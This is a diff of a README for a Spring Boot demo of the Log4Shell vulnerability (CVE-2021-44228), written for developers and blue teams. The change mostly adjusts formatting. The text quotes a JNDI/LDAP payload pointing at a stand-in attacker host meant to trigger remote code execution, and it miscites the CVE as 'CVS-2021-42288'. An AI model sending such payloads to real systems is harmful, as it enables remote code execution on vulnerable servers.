@@ -4,17 +4,22 @@ Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features u
 **tl;dr**
 
 Log4Shell vulnerability in plain English:
+
 1. Vulnerable Web application trusts the user data which shouldn't be trusted, eg. this demo project
+
 2. Vulnerable Log4j2 is used by web app for logging 
-3. The lookup() implementation from org.apache.logging.log4j.core package in the Vulnerable Log4j2 envluates variable ${key:value} in log message and substitute the variable with value.  It opens the door and exposes the vulnerability.
-Once the door can be opened, all you need is your imagation/creativity to craft various of payloads and delivery methods to exploit this log4j2 vulnerability.
-CVS-2021-42288 use carefully brafted ${jndi:ldap://....} payout.
 
-Spring Boot is using logback by default.  It is supporting the use of log4j2 and hance it's exposed to this vulnerability if Log4j2 is not patched.
+3. The lookup() implementation from org.apache.logging.log4j.core package in the Vulnerable Log4j2 envluates variable ${key:value} in log message and substitute the variable with value. It opens the door and exposes the vulnerability.
 
-**Hacking is illegal!** It's not a good idea to encourage exploitation of this vulunerability.  That being said, developer/blue team member should have better understanding on the "how" so to build a better and secured application.
+Once the door is opened, all you need is your imagation/creativity to craft various of payloads and delivery methods to exploit this log4j2 vulnerability.
 
-The purpose of this demo is for developer/blue team member to understand how older version of log4j2 is being exploitted and how to patch it.  Instead of using ${jndi:ldap://attackerserver.com/RCE} as payload, we display the OS version instead in this demo.  
+The CVS-2021-42288 uses carefully brafted ${jndi:ldap://....} payout.
+
+Spring Boot is using logback by default. It is supporting the use of log4j2 and hance it's exposed to this vulnerability if Log4j2 is not patched.
+
+**Hacking is illegal!** It's not a good idea to encourage exploitation of this vulunerability. That being said, developer/blue team member should have better understanding on the "how" so to build a better and secured application.
+
+The purpose of this demo is for developer/blue team member to understand how older version of log4j2 is being exploitted and how to patch it. Instead of using ${jndi:ldap://attackerserver.com/RCE} as payload, we display the OS version instead in this demo.  
 
 ## Create a New Maven Demo Project for Log4Shell(CVE-2021-44228)
 ### 1. Create an empty project using Spring CLI
